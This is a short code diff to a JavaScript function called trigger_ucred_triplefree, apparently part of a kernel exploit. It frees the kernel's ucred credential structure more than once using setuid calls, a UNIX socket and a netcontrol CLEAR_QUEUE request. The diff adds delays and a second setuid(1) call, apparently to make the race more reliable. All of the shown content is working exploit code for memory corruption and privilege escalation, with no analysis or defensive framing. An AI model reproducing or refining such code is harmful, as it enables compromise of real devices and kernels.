@@ -1449,6 +1449,7 @@ function trigger_ucred_triplefree() {
     // -----------------------------
     consoleNotify("[2] Calling setuid(1) → allocating new ucred...");
     setuid(1);
+    nanosleep_fun(2);
     consoleNotify("[2] setuid(1) done → new ucred active");
 
 
@@ -1459,6 +1460,10 @@ function trigger_ucred_triplefree() {
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
     consoleNotify("[3] uaf_socket opened → FD = " + uaf_socket);
 
+    consoleNotify("[3] Calling setuid(1) → allocating new ucred...");
+    setuid(1);
+    nanosleep_fun(2);
+    consoleNotify("[3] setuid(1) done → new ucred active");
 
     // -----------------------------
     // 4) unregister → free file + ucred
@@ -1469,6 +1474,7 @@ function trigger_ucred_triplefree() {
     consoleNotify("[4] Sending CLEAR_QUEUE...");
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
     consoleNotify("[4] CLEAR_QUEUE sent");
+
 
 
     // -----------------------------
